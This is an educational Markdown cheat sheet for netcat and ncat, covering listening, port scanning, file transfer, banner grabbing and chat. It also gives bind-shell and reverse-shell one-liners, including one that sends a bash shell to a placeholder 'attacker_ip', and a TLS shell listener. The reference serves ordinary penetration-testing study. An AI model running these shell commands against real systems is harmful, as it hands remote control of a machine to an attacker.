# 🔪 Netcat (nc) — The Swiss Army Knife of Networking

> _A lightweight, flexible networking utility for reading from and writing to TCP and UDP connections._  
> Widely used for **debugging**, **scanning**, **file transfer**, **banner grabbing**, **pivoting**, and **remote administration**.

---

## 🔑 Key Features

|Feature|Description|
|---|---|
|🔁 **TCP & UDP**|Supports both protocols natively|
|🖥️ **Client / Server Mode**|Can listen (server) or connect (client)|
|🔍 **Port Scanning**|Built-in scanning with ranges|
|📁 **File Transfer**|Send/receive files between hosts|
|🏷️ **Banner Grabbing**|Enumerate service banners|
|⚙️ **Program Execution**|Execute programs on connection (`-e`, if supported)|
|🌐 **IPv4 & IPv6**|Dual-stack support|
|🐛 **Debug Modes**|Verbose and hex dump modes|
|🔒 **Proxy / SSL/TLS**|Via **Ncat** (Nmap's version)|
|📜 **Scripting**|Works interactively or in scripts|

---

## 📦 Installation

### 🐧 Debian / Ubuntu

```bash
sudo apt install netcat-openbsd     # recommended modern build
sudo apt install netcat-traditional # legacy variant with -e support
```

### 🎩 RHEL / CentOS / Fedora

```bash
sudo yum install nmap-ncat
```

### 🪟 Windows

- **Ncat from Nmap** — supports SSL, proxies
- **Static Netcat builds** — portable binaries

---

## ⚙️ Basic Syntax

```bash
nc [options] host port
```

|Mode|Command|
|---|---|
|🔌 **Client mode**|`nc target 80`|
|👂 **Server (listen) mode**|`nc -l -p 4444`|

---

## 🛠️ Common Options

|Option|Description|
|---|---|
|`-l`|Listen mode (server)|
|`-p <port>`|Specify port number|
|`-n`|No DNS resolution (numeric IP addresses only)|
|`-v`|Verbose output|
|`-vv`|Very verbose output|
|`-e <program>`|Execute program after connection _(remote shell)_|
|`-u`|Use UDP protocol instead of TCP|
|`-w <seconds>`|Timeout for connects and final net reads|
|`-z`|Zero-I/O mode _(used for scanning ports)_|
|`-o <file>`|Output hex dump of traffic sent/received|
|`-q <seconds>`|Quit after EOF on stdin and delay|

---

## 🚀 Examples

---

### 1. 👂 Listening as a Server

```bash
nc -l -p 8888
nc -nlvp 4444   # verbose, numeric only
```

---

### 2. 🔍 Port Scanning

```bash
# Scan a single port
nc -zv 192.168.1.31 80

# Scan a port range (ports 1–1000) with 2s timeout
nc -zvv -w 2 192.168.1.31 1-1000
```

---

### 3. 📁 File Transfer

#### 📤 File send from Client → Server

```bash
# Receiver (server side)
nc -l -p 6666 > file.txt

# Sender (client side)
nc 192.168.1.7 6666 < file.txt
```

#### 📥 File send from Server → Client

```bash
# Receiver (server side — serves the file)
nc -nlvp 6666 < user.txt

# Sender (client side — pulls the file)
nc -nv 192.168.1.7 6666 > user.txt
```

---

### 4. 🏷️ Banner Grabbing

```bash
nc -vv 192.168.1.20 22
# 👉 Connects to SSH port and grabs the service banner
```

---

### 5. 💬 Chat (one-to-one)

```bash
# Terminal 1 — listen
nc -l -p 1234

# Terminal 2 — connect
nc 192.168.1.7 1234
```

> 💡 Both terminals can now send messages to each other in real-time.

---

### 6. 🐚 Remote Shells

#### 🔗 Bind Shell _(on target — waits for attacker to connect)_

```bash
# Linux
nc -nlvp 4444 -e /bin/bash

# Windows
nc.exe -nlvp 4444 -e cmd.exe
```

#### 🔄 Reverse Shell _(target → attacker)_

```bash
# Run on the TARGET — connects back to attacker
nc attacker_ip 4444 -e /bin/bash
```

> ⚠️ **Note:** `-e` flag requires `netcat-traditional` or `ncat`. The `netcat-openbsd` version does **not** support `-e`.

---

### 7. 🔒 Proxying / Tunneling with Ncat

```bash
# TLS encrypted listener (server)
ncat --ssl -l 8443 --sh-exec "/bin/bash"

# Client connecting over TLS
ncat --ssl server_ip 8443
```

---

## 🧠 Advanced Usage

|Technique|Command|Notes|
|---|---|---|
|**Keep listener alive**|`nc -nlvkp 4444`|`-k` keeps listening after disconnect|
|**UDP mode**|`nc -u target 53`|Useful for DNS or UDP-based services|
|**Hex dump traffic**|`nc -o dump.hex target 80`|Saves hex dump of session|
|**Relay / pipe**|`mkfifo /tmp/f; nc -l -p 4444 < /tmp/f \| nc target 80 > /tmp/f`|Simple netcat relay|

---

## ⚡ Quick Reference Cheatsheet

```
LISTEN          nc -nlvp <port>
CONNECT         nc <ip> <port>
PORT SCAN       nc -zv <ip> <port-range>
BANNER GRAB     nc -vv <ip> <port>
FILE RECV       nc -l -p <port> > file
FILE SEND       nc <ip> <port> < file
BIND SHELL      nc -nlvp <port> -e /bin/bash
REVERSE SHELL   nc <attacker_ip> <port> -e /bin/bash
CHAT            nc -l -p <port>  |  nc <ip> <port>
TLS TUNNEL      ncat --ssl -l <port> --sh-exec "/bin/bash"
```

---

> 📌 _Netcat is a foundational tool in any network security toolkit. Always use responsibly and only on networks/systems you have explicit permission to test._